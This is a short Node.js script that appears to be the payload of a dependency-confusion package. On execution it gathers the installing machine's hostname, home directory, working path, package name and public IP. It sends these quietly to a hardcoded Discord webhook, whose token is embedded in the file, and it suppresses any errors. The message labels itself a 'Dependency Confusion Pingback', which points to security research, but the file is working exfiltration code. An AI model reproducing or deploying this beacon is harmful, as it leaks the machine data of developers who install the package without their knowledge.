const https = require('https');
const os = require('os');
const packageJSON = require('./package.json');

// Replace with your Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1113050155214700544/PuZyFglV6DGT8nxrvPi7aYZIr6DOqTorfocewi_XaHpzWQ4U96D_hNQbs_FQoFHg91YN';

const data = {
  time: new Date().toISOString(),
  package: packageJSON.name,
  hostname: os.hostname(),
  ip: 'Unknown (fetching...)', // Will update below
  homeDir: os.homedir(),
  currentPath: __dirname,
};

// Get public IP (fallback to manual if API fails)
https.get('https://api.ipify.org?format=json', (res) => {
  let rawData = '';
  res.on('data', (chunk) => rawData += chunk);
  res.on('end', () => {
    try {
      data.ip = JSON.parse(rawData).ip || 'Unknown';
      sendToDiscord();
    } catch {
      data.ip = 'Unknown';
      sendToDiscord();
    }
  });
}).on('error', () => {
  data.ip = 'Unknown';
  sendToDiscord();
});

function sendToDiscord() {
  const payload = JSON.stringify({
    content: `**Dependency Confusion Pingback**\n` +
      `\`\`\`json\n${JSON.stringify(data, null, 2)}\`\`\``
  });

  const req = https.request(new URL(WEBHOOK_URL), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
  }, (res) => {});

  req.on('error', () => {}); // Silent fail
  req.write(payload);
  req.end();
}